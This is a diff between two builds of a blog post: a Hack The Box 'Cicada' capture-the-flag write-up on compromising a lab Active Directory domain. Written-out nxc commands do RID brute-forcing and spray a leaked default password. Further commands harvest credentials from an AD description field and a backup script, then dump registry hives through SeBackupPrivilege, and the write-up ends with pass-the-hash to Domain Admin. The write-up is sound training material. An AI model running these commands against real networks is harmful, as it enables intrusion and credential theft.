@@ -1,422 +1,60 @@
-<!DOCTYPE html>
-<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="content-type" content="text/html">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title itemprop="name">HTB: Cicada | kanyo&#39;s blog</title>
-<meta property="og:title" content="HTB: Cicada | kanyo&#39;s blog" />
-<meta name="twitter:title" content="HTB: Cicada | kanyo&#39;s blog" />
-<meta itemprop="name" content="HTB: Cicada | kanyo&#39;s blog" />
-<meta name="application-name" content="HTB: Cicada | kanyo&#39;s blog" />
-<meta property="og:site_name" content="" />
-
-<meta name="description" content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin.">
-<meta itemprop="description" content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin." />
-<meta property="og:description" content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin." />
-<meta name="twitter:description" content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin." />
-
-<meta property="og:locale" content="en-gb" />
-<meta name="language" content="en-gb" />
-
-  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-cicada/" title="English" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.161.1">
-
-    
-    <meta property="og:url" content="http://localhost:1313/writeups/htb-cicada/">
-  <meta property="og:site_name" content="kanyo&#39;s blog">
-  <meta property="og:title" content="HTB: Cicada">
-  <meta property="og:description" content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin.">
-  <meta property="og:locale" content="en_gb">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2026-06-01T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-06-01T00:00:00+00:00">
-    <meta property="article:tag" content="Vss">
-    <meta property="article:tag" content="Nxc">
-    <meta property="article:tag" content="Windows">
-
-
-    
-    
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="HTB: Cicada">
-  <meta name="twitter:description" content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin.">
-
-
-    
-
-    <link rel="canonical" href="http://localhost:1313/writeups/htb-cicada/">
-    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
-    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
-
-    
-    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
-    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
-    <link rel="shortcut icon" href="/favicon.ico">
-
-
-
-
-<link rel="manifest" href="http://localhost:1313/site.webmanifest">
-
-<meta name="msapplication-config" content="/browserconfig.xml">
-<meta name="msapplication-TileColor" content="#2d89ef">
-<meta name="theme-color" content="#434648">
-
-    
-    
-</head>
-<body data-theme = "dark" class="notransition">
-
-<script src="/js/theme.js"></script>
-
-<div class="navbar" role="navigation">
-    <nav class="menu" aria-label="Main Navigation">
-        <a href="http://localhost:1313/" class="logo">
-            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
-viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
-stroke-linejoin="round" class="feather feather-home">
-<title>Home</title>
-<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
-<polyline points="9 22 9 12 15 12 15 22"></polyline>
-</svg>
-        </a>
-        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
-        <label for="menu-trigger">
-            <span class="menu-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
-            </span>
-        </label>
-
-        <div class="trigger">
-            <ul class="trigger-container">
-                
-                
-                <li>
-                    <a class="menu-link " href="/">
-                        Home
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/blogs/">
-                        Blogs
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link active" href="/writeups/">
-                        Writeups
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/about/">
-                        About
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="https://notes.chaelsoo.me">
-                        Cheatsheet
-                    </a>
-                    
-                </li>
-                
-                <li class="menu-separator">
-                    <span>|</span>
-                </li>
-                
-                
-            </ul>
-            <a id="mode" href="#">
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-            </a>
-        </div>
-    </nav>
-</div>
-
-<div class="wrapper post">
-    <main class="page-content" aria-label="Content">
-        <article>
-            <header class="header">
-                <h1 class="header-title">HTB: Cicada</h1>
-                
-                
-                
-                <div class="post-meta">
-                    <time datetime="2026-06-01T00:00:00&#43;00:00" itemprop="datePublished"> 1 Jun 2026 </time>
-                </div>
-                
-            </header>
-            
-            <img src="/images/writeups/htb-cicada/htb-cicada-pwned.png" alt="HTB: Cicada" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
-            
-            <div class="toc-container">
-    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
-    <div class="toc-content" id="tocContent">
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#recon">Recon</a></li>
-    <li><a href="#default-password-from-hr-notice">Default Password from HR Notice</a></li>
-    <li><a href="#davidorelious-from-an-ad-description-field">david.orelious from an AD Description Field</a></li>
-    <li><a href="#emilyoscars-from-a-backup-script">emily.oscars from a Backup Script</a></li>
-    <li><a href="#backup-operators-and-sebackupprivilege">Backup Operators and SeBackupPrivilege</a></li>
-  </ul>
-</nav>
-    </div>
-</div>
-
-<div class="mini-toc" id="miniToc">
-    <div class="mini-toc-header">
-        <div class="mini-toc-title">Contents</div>
-        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
-                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
-            </svg>
-        </button>
-    </div>
-    <div class="mini-toc-content" id="miniTocContent"></div>
-</div>
-            <div class="page-content">
-                <p>Windows box, no web server. Everything comes from SMB and LDAP, one credential leading to the next. It&rsquo;s a nice example of how a single operational security mistake, a default password in an HR notice, a cleartext password in an AD description, credentials embedded in a script, cascades into domain compromise. The escalation at the end via Backup Operators and SeBackupPrivilege is a classic that deserves proper understanding.</p>
-<h2 id="recon">Recon</h2>
-<p>10.129.231.149, domain <code>cicada.htb</code>, DC hostname <code>CICADA-DC</code>. Windows Server 2022. Standard AD ports, WinRM on 5985, no MSSQL this time. Anonymous SMB auth was denied, but the guest account worked:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.231.149 -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
-</span></span><span class="line"><span class="cl">Share      Permissions
-</span></span><span class="line"><span class="cl">-----      -----------
-</span></span><span class="line"><span class="cl">HR         READ
-</span></span><span class="line"><span class="cl">IPC$       READ
-</span></span></code></pre></div><p>The HR share stood out. Guest could read it.</p>
-<h2 id="default-password-from-hr-notice">Default Password from HR Notice</h2>
-<p>One file in HR: <code>Notice from HR.txt</code>. A welcome message to new hires:</p>
-<pre tabindex="0"><code>Dear new hire!
+<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HTB: Cicada | kanyo's blog</title><meta property="og:title" content="HTB: Cicada | kanyo's blog"><meta name=twitter:title content="HTB: Cicada | kanyo's blog"><meta itemprop=name content="HTB: Cicada | kanyo's blog"><meta name=application-name content="HTB: Cicada | kanyo's blog"><meta property="og:site_name" content><meta name=description content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin."><meta itemprop=description content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin."><meta property="og:description" content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin."><meta name=twitter:description content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/htb-cicada/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/htb-cicada/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HTB: Cicada"><meta property="og:description" content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-06-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-01T00:00:00+00:00"><meta property="article:tag" content="Vss"><meta property="article:tag" content="Nxc"><meta property="article:tag" content="Windows"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: Cicada"><meta name=twitter:description content="An Easy Windows box where one default password in an HR share starts a credential chain. An AD description field and a backup script leak two more accounts, and Backup Operators with SeBackupPrivilege gets Domain Admin."><link rel=canonical href=https://chaelsoo.me/writeups/htb-cicada/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+</a><input type=checkbox id=menu-trigger class=menu-trigger>
+<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
+<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HTB: Cicada</h1><div class=post-meta><time datetime=2026-06-01T00:00:00+00:00 itemprop=datePublished>1 Jun 2026</time></div></header><img src=/images/writeups/htb-cicada/htb-cicada-pwned.png alt="HTB: Cicada" style="width:100%;border-radius:.5rem;margin:1.5rem 0"><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#default-password-from-hr-notice>Default Password from HR Notice</a></li><li><a href=#davidorelious-from-an-ad-description-field>david.orelious from an AD Description Field</a></li><li><a href=#emilyoscars-from-a-backup-script>emily.oscars from a Backup Script</a></li><li><a href=#backup-operators-and-sebackupprivilege>Backup Operators and SeBackupPrivilege</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
+<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>Windows box, no web server. Everything comes from SMB and LDAP, one credential leading to the next. It&rsquo;s a nice example of how a single operational security mistake, a default password in an HR notice, a cleartext password in an AD description, credentials embedded in a script, cascades into domain compromise. The escalation at the end via Backup Operators and SeBackupPrivilege is a classic that deserves proper understanding.</p><h2 id=recon>Recon</h2><p>10.129.231.149, domain <code>cicada.htb</code>, DC hostname <code>CICADA-DC</code>. Windows Server 2022. Standard AD ports, WinRM on 5985, no MSSQL this time. Anonymous SMB auth was denied, but the guest account worked:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.129.231.149 -u <span class=s1>&#39;guest&#39;</span> -p <span class=s1>&#39;&#39;</span> --shares
+</span></span><span class=line><span class=cl>Share      Permissions
+</span></span><span class=line><span class=cl>-----      -----------
+</span></span><span class=line><span class=cl>HR         READ
+</span></span><span class=line><span class=cl>IPC$       READ
+</span></span></code></pre></div><p>The HR share stood out. Guest could read it.</p><h2 id=default-password-from-hr-notice>Default Password from HR Notice</h2><p>One file in HR: <code>Notice from HR.txt</code>. A welcome message to new hires:</p><pre tabindex=0><code>Dear new hire!
 
 Welcome to Cicada Corp! ...
 
 Your default password is: Cicada$M6Corpb*@Lp#nZp!8
 
 To change your password: ...
-</code></pre><p>Default password, handed out in a file sitting on a guest-readable share. Now I needed usernames to spray it against. With no web interface or other source, RID brute-force via SMB enumerates domain SIDs numerically:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.231.149 -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --rid-brute <span class="m">4000</span> <span class="p">|</span> grep SidTypeUser
-</span></span><span class="line"><span class="cl">500: CICADA<span class="se">\A</span>dministrator
-</span></span><span class="line"><span class="cl">501: CICADA<span class="se">\G</span>uest
-</span></span><span class="line"><span class="cl">502: CICADA<span class="se">\k</span>rbtgt
-</span></span><span class="line"><span class="cl">1104: CICADA<span class="se">\j</span>ohn.smoulder
-</span></span><span class="line"><span class="cl">1105: CICADA<span class="se">\s</span>arah.dantelia
-</span></span><span class="line"><span class="cl">1106: CICADA<span class="se">\m</span>ichael.wrightson
-</span></span><span class="line"><span class="cl">1108: CICADA<span class="se">\d</span>avid.orelious
-</span></span><span class="line"><span class="cl">1601: CICADA<span class="se">\e</span>mily.oscars
-</span></span></code></pre></div><p>Five regular users. Sprayed the default password against all of them:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.231.149 -u users.txt -p <span class="s1">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> --continue-on-success
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> john.smoulder: STATUS_LOGON_FAILURE
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> sarah.dantelia: STATUS_LOGON_FAILURE
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> michael.wrightson:Cicada<span class="nv">$M6Corpb</span>*@Lp#nZp!8
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> david.orelious: STATUS_LOGON_FAILURE
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> emily.oscars: STATUS_LOGON_FAILURE
-</span></span></code></pre></div><p><code>michael.wrightson</code> hadn&rsquo;t changed his default password. WinRM denied him, but LDAP worked, enough to query the directory.</p>
-<h2 id="davidorelious-from-an-ad-description-field">david.orelious from an AD Description Field</h2>
-<p>With authenticated LDAP access, I ran nxc&rsquo;s <code>get-desc-users</code> module. It queries the <code>description</code> attribute on all user objects in AD. Admins sometimes stash passwords there when they create accounts:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap 10.129.231.149 -u michael.wrightson -p <span class="s1">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> -M get-desc-users
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User: david.orelious description: Just in <span class="k">case</span> I forget my password is aRt<span class="nv">$Lp</span><span class="c1">#7t*VQ!3</span>
-</span></span></code></pre></div><p><code>david.orelious:aRt$Lp#7t*VQ!3</code>. Self-documented in the description field of his own AD account.</p>
-<p>David had access to the DEV share that michael couldn&rsquo;t see:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.231.149 -u david.orelious -p <span class="s1">&#39;aRt$Lp#7t*VQ!3&#39;</span> --shares
-</span></span><span class="line"><span class="cl">Share   Permissions
-</span></span><span class="line"><span class="cl">DEV     READ
-</span></span><span class="line"><span class="cl">HR      READ
-</span></span></code></pre></div><h2 id="emilyoscars-from-a-backup-script">emily.oscars from a Backup Script</h2>
-<p>One file in the DEV share: <code>Backup_script.ps1</code>. A PowerShell script that compresses a directory and saves it as a backup:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;emily.oscars&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$credentials</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
-</span></span></code></pre></div><p>Hardcoded credentials for the user running the backup job. <code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code>. This one had WinRM:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc winrm 10.129.231.149 -u emily.oscars -p <span class="s1">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> cicada.htb<span class="se">\e</span>mily.oscars:Q!3@Lp#M6b*7t*Vt <span class="o">(</span>Pwn3d!<span class="o">)</span>
-</span></span></code></pre></div><p>User flag on her desktop.</p>
-<h2 id="backup-operators-and-sebackupprivilege">Backup Operators and SeBackupPrivilege</h2>
-<p>I noticed emily&rsquo;s group memberships in BloodHound before I had her password. She was in the Backup Operators group alongside Remote Management Users:</p>
-<p><img src="/images/writeups/htb-cicada/bloodhound-emily-backup-operators.png" alt="BloodHound graph showing EMILY.OSCARS@CICADA.HTB is MemberOf Backup Operators, Remote Management Users, and Domain Users groups"></p>
-<p><code>whoami /all</code> inside her WinRM session confirmed it: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, both enabled.</p>
-<p>Backup Operators is a privileged built-in group designed to let members back up and restore files regardless of their normal permissions. The underlying mechanism is SeBackupPrivilege, which bypasses normal ACL checks when opening files for backup purposes. On a domain controller, that includes the registry hives, specifically <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code>, which together allow offline extraction of all local account NT hashes.</p>
-<p>The nxc <code>backup_operator</code> module automates the whole thing remotely. It starts RemoteRegistry via a named pipe, then uses backup semantics to save the hives directly to a readable share:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.231.149 -u emily.oscars -p <span class="s1">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> -M backup_operator
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Triggering RemoteRegistry to start through named pipe...
-</span></span><span class="line"><span class="cl">Saved HKLM<span class="se">\S</span>AM to <span class="se">\\</span>10.129.231.149<span class="se">\S</span>YSVOL<span class="se">\S</span>AM
-</span></span><span class="line"><span class="cl">Saved HKLM<span class="se">\S</span>YSTEM to <span class="se">\\</span>10.129.231.149<span class="se">\S</span>YSVOL<span class="se">\S</span>YSTEM
-</span></span><span class="line"><span class="cl">Saved HKLM<span class="se">\S</span>ECURITY to <span class="se">\\</span>10.129.231.149<span class="se">\S</span>YSVOL<span class="se">\S</span>ECURITY
-</span></span></code></pre></div><p>Downloaded the three files, then used secretsdump locally:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py -sam SAM -system SYSTEM LOCAL
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping <span class="nb">local</span> SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
-</span></span></code></pre></div><p>Pass-the-hash:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
-</span></span></code></pre></div><p>Root flag. The password in the account description field is the thing to remember from this one. Not a misconfigured service, not a protocol weakness. Just someone typing a credential into a field meant for a note and forgetting about it. Check description fields in BloodHound data, every time.</p>
-
-            </div>
-        </article></main>
-</div>
-
-<script>
-    function toggleToc() {
-        const content = document.getElementById('tocContent');
-        const button = document.querySelector('.toc-toggle');
-        if (!content || !button) return;
-        content.classList.toggle('expanded');
-        button.classList.toggle('expanded');
-    }
-
-    function toggleMiniToc() {
-        const miniToc = document.getElementById('miniToc');
-        if (miniToc) miniToc.classList.toggle('minimized');
-    }
-
-    function setupActiveHighlighting(links) {
-        const targets = Array.from(links).map(link => {
-            const href = link.getAttribute('href');
-            if (href && href.startsWith('#')) {
-                const el = document.getElementById(decodeURIComponent(href.slice(1)));
-                if (el) return { link, element: el };
-            }
-            return null;
-        }).filter(Boolean);
-
-        if (targets.length === 0) return;
-
-        function update() {
